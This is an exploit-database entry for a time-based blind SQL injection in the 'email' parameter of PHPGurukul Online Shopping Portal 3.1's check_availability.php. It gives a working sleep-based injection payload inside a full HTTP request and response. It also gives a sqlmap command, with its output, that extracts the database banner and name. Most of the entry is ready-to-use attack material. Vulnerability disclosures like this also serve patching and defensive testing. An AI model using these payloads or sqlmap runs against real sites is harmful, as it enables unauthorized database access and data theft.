@@ -1,0 +1,99 @@
+id: 36580
+date: 07/21/2021
+title: Online Shopping Portal 3.1 SQL Injection Vulnerability
+author: faisalfs10x
+cves: 
+
+# Exploit Title: Online Shopping Portal - time-based blind SQL Injection
+# Exploit Author: faisalfs10x (https://github.com/faisalfs10x)
+# Vendor Homepage: https://phpgurukul.com
+# Software Link: https://phpgurukul.com/shopping-portal-free-download/
+# Version: 3.1
+# Tested on: Windows 10, XAMPP
+
+
+################
+# Description  #
+################
+
+# The email parameter is vulnerable to time-based SQL injection on the /check_availability.php endpoint that serves as a checker whether a new user's email is already exist within the database or not. Based on the payload used on 'email' parameter which is "email=tester@gmail.com'XOR(if(now()=sysdate(),sleep(5),0))XOR'fsx", the server response is about 5 seconds delay which mean it is vulnerable to MySQL Blind (Time Based). An attacker can use sqlmap to further the exploitation for extracting sensitive information from the database.
+
+
+#####################
+# PoC of detection  #
+#####################
+
+
+Request:
+========
+
+POST /shopping/check_availability.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 65
+Origin: http://localhost
+DNT: 1
+Connection: close
+Referer: http://localhost/shopping/login.php
+Cookie: PHPSESSID=94hqeuk00aj25glgtju4105n06
+Sec-GPC: 1
+
+email=tester@gmail.com'XOR(if(now()=sysdate(),sleep(5),0))XOR'fsx
+
+
+
+Response: duration = 340 bytes | 5,005 millis
+========
+
+HTTP/1.1 200 OK
+Date: Fri, 09 Jul 2021 14:15:14 GMT
+Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.24
+X-Powered-By: PHP/5.6.24
+Content-Length: 121
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<span style='color:green'> Email available for Registration .</span><script>$('#submit').prop('disabled',false);</script>
+
+
+
+########################
+# PoC of exploitation  #
+########################
+
+# Run sqlmap to extract current database name:
+
+$ sqlmap -u "http://localhost/shopping/check_availability.php" --data="email=tester@gmail.com" --cookie="PHPSESSID=94hqeuk00aj25glgtju4105n06" --timeout=30 -p "email" --level=3 --risk=1 --threads=10 --time-sec=5 -b --current-db --batch --answers="crack=N,dict=N,continue=Y,quit=N" --technique=T 
+
+
+###########
+# Output  #
+###########
+
+---
+Parameter: email (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=tester@gmail.com' AND (SELECT 4922 FROM (SELECT(SLEEP(5)))SAxU)-- ILJB
+---
+
+[INFO] the back-end DBMS is MySQL
+[INFO] fetching banner
+multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
+[INFO] retrieved: 
+[WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+10.1.19-MariaDB
+web server operating system: Windows
+web application technology: PHP 5.6.24, Apache 2.4.23
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+banner: '10.1.19-MariaDB'
+[INFO] fetching current database
+[INFO] retrieved: shopping
+current database: 'shopping'
+
+#  0day.today [2023-03-23]  #
